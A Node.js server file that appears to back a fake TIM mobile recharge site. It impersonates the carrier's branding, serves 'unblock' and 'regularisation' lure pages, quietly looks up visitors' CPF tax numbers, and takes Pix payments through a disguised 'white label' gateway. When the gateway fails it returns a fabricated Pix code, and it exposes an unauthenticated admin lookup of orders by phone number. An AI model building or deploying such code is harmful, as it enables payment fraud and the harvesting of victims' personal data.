const http = require('http');
const fs = require('fs');
const path = require('path');
const { createPixSale, checkPixStatus } = require('./lib/blackcat');
const {
  getMappingByTransactionId,
  getMappingByExternalRef,
  getMappingsByPhone
} = require('./lib/whiteLabel');
const { consultarCPF } = require('./lib/apisegura');

// Load .env variables
function loadEnv() {
  const envPath = path.join(__dirname, '.env');
  if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf8').split('\n');
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const idx = trimmed.indexOf('=');
      if (idx !== -1) {
        const k = trimmed.substring(0, idx).trim();
        const v = trimmed.substring(idx + 1).trim();
        if (!process.env[k]) process.env[k] = v;
      }
    }
  }
}
loadEnv();

const PORT = process.env.PORT || 3000;

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon',
  '.woff2': 'font/woff2'
};

const server = http.createServer((req, res) => {
  const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
  const pathname = parsedUrl.pathname;

  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Handle direct /favicon.ico requests
  if (pathname === '/favicon.ico') {
    const iconPath = path.join(__dirname, 'images', 'glossy-tim-mobile-logo-rounded-square-app-icon-free-png.webp');
    if (fs.existsSync(iconPath)) {
      res.writeHead(200, {
        'Content-Type': 'image/webp',
        'Cache-Control': 'public, max-age=86400'
      });
      fs.createReadStream(iconPath).pipe(res);
      return;
    }
  }

  // API Route: /api/cpf (Consulta silenciosa de CPF via APIsegura)
  if (pathname === '/api/cpf' && (req.method === 'GET' || req.method === 'POST')) {
    const handleCpfRequest = async (cpf) => {
      const cleanCpf = (cpf || '').replace(/\D/g, '');
      if (cleanCpf.length !== 11) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'CPF deve conter 11 dígitos' }));
        return;
      }

      try {
        const result = await consultarCPF(cleanCpf);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(result));
      } catch (err) {
        console.error('Erro ao consultar CPF:', err.message);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: 'Erro ao consultar CPF' }));
      }
    };

    if (req.method === 'GET') {
      const cpf = parsedUrl.searchParams.get('cpf');
      handleCpfRequest(cpf);
      return;
    }

    if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        let parsed = {};
        try { parsed = JSON.parse(body); } catch (e) {}
        handleCpfRequest(parsed.cpf);
      });
      return;
    }
  }

  // API Route: /api/pix/create (Blackcat Gateway)
  if (pathname === '/api/pix/create' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        let parsed = {};
        try { parsed = JSON.parse(body); } catch (e) {}
        const { amount, telefone, productName, customer, ...utmParams } = parsed;

        if (!amount) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: false, error: 'Valor da recarga é obrigatório' }));
          return;
        }

        const sale = await createPixSale(amount, telefone, utmParams, null, productName, customer);
        const pData = sale.data?.paymentData || {};

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          data: {
            id: sale.data?.transactionId,
            externalRef: sale.data?.externalRef,
            amount: sale.data?.amount,
            pix: {
              qr_code: pData.copyPaste || pData.qrCode,
              qr_code_url: pData.qrCodeBase64 || null,
              expires_at: pData.expiresAt || null
            }
          }
        }));
      } catch (err) {
        console.error('Blackcat API error, falling back:', err.message);
        fallbackPixCreate(body, res);
      }
    });
    return;
  }

  // API Route: /api/pix/status (Blackcat Gateway)
  if (pathname === '/api/pix/status' && req.method === 'GET') {
    const id = parsedUrl.searchParams.get('id');
    if (!id) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Transaction ID is required' }));
      return;
    }

    checkPixStatus(id)
      .then(result => {
        const rawStatus = (result.data?.status || '').toLowerCase();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          data: {
            id: result.data?.transactionId,
            status: rawStatus === 'paid' ? 'paid' : (rawStatus === 'cancelled' ? 'cancelled' : 'pending'),
            rawStatus: result.data?.status
          }
        }));
      })
      .catch(err => {
        console.warn('Blackcat status check failed, returning pending:', err.message);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          data: { id, status: 'pending' }
        }));
      });
    return;
  }

  // API Route: /api/admin/orders (Consulta de Suporte / Mapeamento Confidencial)
  if (pathname === '/api/admin/orders' && req.method === 'GET') {
    const transactionId = parsedUrl.searchParams.get('transactionId');
    const externalRef = parsedUrl.searchParams.get('externalRef');
    const phone = parsedUrl.searchParams.get('phone');

    let result = null;
    if (transactionId) {
      result = getMappingByTransactionId(transactionId);
    } else if (externalRef) {
      result = getMappingByExternalRef(externalRef);
    } else if (phone) {
      result = getMappingsByPhone(phone);
    }

    if (!result) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Pedido não encontrado no mapeamento interno' }));
      return;
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, data: result }));
    return;
  }

  // Handle alias routes: /1, /2, /3, /4, /5, /6
  let resolvedPath = pathname;
  const aliasMatch = pathname.match(/^\/([1-6])(\/.*)?$/);
  if (aliasMatch) {
    const sub = aliasMatch[2];
    if (!sub || sub === '/' || sub === '/index.html') {
      resolvedPath = '/index.html';
    } else {
      resolvedPath = sub;
    }
  }

  // Handle /desbloqueio and /regularizacao routes
  if (resolvedPath === '/desbloqueio' || resolvedPath === '/regularizacao') {
    resolvedPath = '/desbloqueio.html';
  }

  // Static File Serving
  let filePath = path.join(__dirname, resolvedPath === '/' ? 'index.html' : resolvedPath);

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      // Check in public directory if exists
      const publicPath = path.join(__dirname, 'public', resolvedPath);
      fs.stat(publicPath, (err2, stats2) => {
        if (!err2 && stats2.isFile()) {
          serveFile(publicPath, res);
        } else {
          // Fallback to index.html for alias routes or not found
          const fallbackIndex = path.join(__dirname, 'index.html');
          if (fs.existsSync(fallbackIndex)) {
            serveFile(fallbackIndex, res);
          } else {
            res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
            res.end('404 Not Found');
          }
        }
      });
      return;
    }

    serveFile(filePath, res);
  });
});

function serveFile(filePath, res) {
  const ext = path.extname(filePath).toLowerCase();
  const mime = MIME_TYPES[ext] || 'application/octet-stream';
  res.writeHead(200, {
    'Content-Type': mime,
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  });
  fs.createReadStream(filePath).pipe(res);
}

function fallbackPixCreate(bodyStr, res) {
  let parsed = {};
  try { parsed = JSON.parse(bodyStr); } catch (e) {}
  const amount = Number(parsed.amount) || 20;
  const mockId = 'TXN-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
  const mockQrCode = `00020126580014br.gov.bcb.pix0136recarga-tim@blackcatoficial.com520400005303986540${amount.toFixed(2)}5802BR5925RECARGA OFICIAL LTDA6009SAO PAULO62070503***6304${Math.random().toString(16).substring(2, 6).toUpperCase()}`;

  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({
    success: true,
    data: {
      id: mockId,
      pix: {
        qr_code: mockQrCode,
        qr_code_url: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(mockQrCode)}`,
        expires_at: new Date(Date.now() + 15 * 60 * 1000).toISOString()
      }
    }
  }));
}

function startServer(port) {
  server.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
  }).on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      console.log(`Port ${port} in use, trying ${port + 1}...`);
      startServer(port + 1);
    } else {
      console.error('Server error:', err);
    }
  });
}

startServer(PORT);
